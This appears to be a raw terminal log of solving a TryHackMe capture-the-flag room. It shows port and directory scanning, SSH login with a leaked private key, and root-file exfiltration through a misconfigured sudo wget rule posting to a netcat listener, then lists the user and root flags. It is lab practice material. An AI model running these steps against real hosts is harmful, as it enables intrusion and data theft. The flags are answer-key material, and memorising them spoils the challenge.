====================================================================================================================================================================================================================
┌──(vhianph㉿vhianph)-[~/Downloads/Tryhackme]
└─$ nmap -sV -sC 10.201.43.181             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-13 09:37 +07
Nmap scan report for 10.201.43.181
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.37 seconds
                                                                                
┌──(vhianph㉿vhianph)-[~/Downloads/Tryhackme]
└─$ dirsearch -u http://10.201.43.181/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/vhianph/Downloads/Tryhackme/reports/http_10.201.43.181/__25-11-13_09-40-27.txt

Target: http://10.201.43.181/

[09:40:27] Starting: 
[09:40:41] 403 -  278B  - /.ht_wsr.txt
[09:40:41] 403 -  278B  - /.htaccess.bak1
[09:40:41] 403 -  278B  - /.htaccess.orig
[09:40:42] 403 -  278B  - /.htaccess.save
[09:40:42] 403 -  278B  - /.htaccess.sample
[09:40:42] 403 -  278B  - /.htaccessBAK
[09:40:42] 403 -  278B  - /.html
[09:40:42] 403 -  278B  - /.htaccessOLD
[09:40:42] 403 -  278B  - /.httr-oauth
[09:40:42] 403 -  278B  - /.htaccess_sc
[09:40:42] 403 -  278B  - /.htm
[09:40:42] 403 -  278B  - /.htpasswd_test
[09:40:42] 403 -  278B  - /.htpasswds
[09:40:42] 403 -  278B  - /.htaccess_orig
[09:40:42] 403 -  278B  - /.htaccess_extra
[09:40:42] 403 -  278B  - /.htaccessOLD2
[09:43:01] 403 -  278B  - /server-status/
[09:43:01] 403 -  278B  - /server-status
[09:43:05] 301 -  316B  - /sitemap  ->  http://10.201.43.181/sitemap/

Task Completed
====================================================================================================================================================================================================================
┌──(vhianph㉿vhianph)-[~/Downloads/Tryhackme]
└─$ gobuster dir -u http://10.201.44.18/sitemap/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.44.18/sitemap/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.ssh                 (Status: 301) [Size: 319] [--> http://10.201.44.18/sitemap/.ssh/]
/css                  (Status: 301) [Size: 318] [--> http://10.201.44.18/sitemap/css/]
/fonts                (Status: 301) [Size: 320] [--> http://10.201.44.18/sitemap/fonts/]
/images               (Status: 301) [Size: 321] [--> http://10.201.44.18/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]
/js                   (Status: 301) [Size: 317] [--> http://10.201.44.18/sitemap/js/]
Progress: 4746 / 4746 (100.00%)
===============================================================
Finished
===============================================================
====================================================================================================================================================================================================================
┌──(vhianph㉿vhianph)-[~/Downloads/Tryhackme]
└─$ ssh jessie@10.201.32.125 -i id_rsa      
The authenticity of host '10.201.32.125 (10.201.32.125)' can't be established.
ED25519 key fingerprint is: SHA256:6fAPL8SGCIuyS5qsSf25mG+DUJBUYp4syoBloBpgHfc
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:12: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.201.32.125' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ ls
Desktop    Downloads         Music     Public     Videos
Documents  examples.desktop  Pictures  Templates
jessie@CorpOne:~$ cd Documents/
jessie@CorpOne:~/Documents$ ls
user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt 
057c67131c3d5e42dd5cd3075b198ff6
====================================================================================================================================================================================================================
jessie@CorpOne:~/Documents$ sudo -l 
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget



jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.8.89.230:4545 
--2025-11-13 19:02:57--  http://10.8.89.230:4545/
Connecting to 10.8.89.230:4545... connected.
HTTP request sent, awaiting response... No data received.
Retrying.

--2025-11-13 19:03:09--  (try: 2)  http://10.8.89.230:4545/
================================================================================================================================================================================================================
┌──(vhianph㉿vhianph)-[~]
└─$ nc -lvp 4545                  
Listening on 0.0.0.0 4545
Connection received on 10.201.32.125 39238
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.8.89.230:4545
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

b1b968b37519ad1daa6408188649263d
================================================================================================================================================================================================================

=> User flag is 057c67131c3d5e42dd5cd3075b198ff6
=> Root flag is b1b968b37519ad1daa6408188649263d
